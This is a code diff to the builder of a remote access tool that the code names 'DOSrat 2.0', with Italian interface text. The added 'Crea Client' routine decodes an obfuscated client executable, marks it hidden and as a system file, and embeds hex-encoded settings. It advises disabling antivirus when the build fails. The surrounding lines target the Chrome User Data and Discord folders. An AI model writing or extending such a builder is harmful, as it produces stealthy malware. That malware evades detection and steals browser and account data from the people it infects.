@@ -9,7 +9,7 @@ using namespace std;
 
 #include "Client.h"
 
-string Version = "2.0.0 B1";
+string Version = "2.0.0-b.1";
 CLIENT Clients[MAX_CLIENTS];
 
 #include "Classi.h"
@@ -29,6 +29,8 @@ int main()
     ConsoleUtils cu;
     WindowUtils wu;
     TcpIP Server;
+    Encode en;
+    SystemUtils su;
     Clu = new ClientUtils(SettaggiS);
 
     VectString MenuPrincipale;
@@ -63,7 +65,6 @@ int main()
     cli.LoadingPercentage = 15;
     cli.LoadingText = "Caricamento Percorsi...";
 
-    Percorsi.push_back("C:");
     Percorsi.push_back("C:\\Users\\<User>\\Documents");
     Percorsi.push_back("C:\\Users\\<User>\\AppData\\Local\\Discord");
     Percorsi.push_back("C:\\Users\\<User>\\AppData\\Local\\Google\\Chrome\\User Data");
@@ -269,7 +270,59 @@ int main()
 
                         // Crea Client
                         case 8:
-                            // WIP
+                            cout << endl;
+
+                            cli.LoadingPercentage = 0;
+                            cli.LoadingText = "Preparazione Client";
+                            cli.FullBarWithText(20);
+
+                            du.SetCurrDir(du.GetModuleFilePath());
+
+                            if (!du.CheckFile("Build\\Client.exe"))
+                            {
+                                cli.StopBar(250);
+                                tc.SetColor(tc.Red);
+                                cout << "Errore: file \"Build\\Client.exe\" non trovato.\nProva a riscaricare DOSrat 2.0." << endl;
+                                tc.SetColor(tc.Default);
+                                Sleep(5000);
+                                break;
+                            }
+
+                            cli.LoadingPercentage = 20;
+
+                            du.DelFile(SettaggiC.ExeName);
+
+                            if (!en.CharUnShift(69, "Build\\Client.exe", SettaggiC.ExeName))
+                            {
+                                cli.StopBar(250);
+                                tc.SetColor(tc.Red);
+                                cout << "Errore durante la lettura/scrittura del Client.\nDisattiva l'antivirus e riprova." << endl;
+                                tc.SetColor(tc.Default);
+                                Sleep(5000);
+                                break;
+                            }
+
+                            cli.LoadingPercentage = 50;
+                            cli.LoadingText = "Impostazione attributi";
+
+                            if (SettaggiC.HideExe)
+                                su.NoOutputCMD("attrib +h " + SettaggiC.ExeName);
+                            if (SettaggiC.SystemFile)
+                                su.NoOutputCMD("attrib +s " + SettaggiC.ExeName);
+
+                            cli.LoadingPercentage = 75;
+                            cli.LoadingText = "Personalizzazione settaggi";
+
+                            du.AppendToFile(SettaggiC.ExeName, en.AsciiToHex("{START}" + SettaggiC.DumpSettingsForBuild() + "{END}"));
+
+                            cli.LoadingPercentage = 100;
+                            cli.StopBar(250);
+                            
+                            tc.SetColor(tc.Lime);
+                            cout << "Creazione client completata!" << endl;
+                            tc.SetColor(tc.Default);
+
+                            Sleep(1500);
                             break;
                     }
 
